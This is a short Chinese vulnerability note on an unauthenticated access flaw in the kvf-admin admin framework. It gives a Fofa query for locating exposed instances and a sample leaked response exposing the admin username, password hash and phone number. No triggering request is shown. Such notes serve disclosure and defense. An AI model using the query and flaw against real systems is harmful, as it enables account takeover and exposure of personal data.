# K8-10kvfadmin存在未授权漏洞

<u></u>





### 漏洞描述：kvf-admin是一套快速开发框架、脚手架、后台管理系统、权限系统.攻击者可利用漏洞获取系统敏感信息并接管平台。



### Fofa语句：title="kvfadmin"



### 漏洞复现：

```json
{
"code": 200,
"msg": "请求成功",
"data": [
{
"current": 1,
"size": 10,
"id": 1,
"username": "admin",
"password": "e09adc3949ba59abbe56e057f20f883e",
"realname": "系统管理员",
"sex": 1,
"phone": "18218798428",
"tel": "123",
"email": "123",
"avatar": "static/image/avatar/tz.jpeg",
"jobTitle": "超级管理员",
"status": 0,
"delFlag": 0,
"createBy": null,
"updateTime": "2019-05-19 17:39:12",
"createTime": "2019-04-30 22:44:17",
"idcard": null,
"address": null,
"indate": null,
"userId": null,
"deptId": 3
},
```

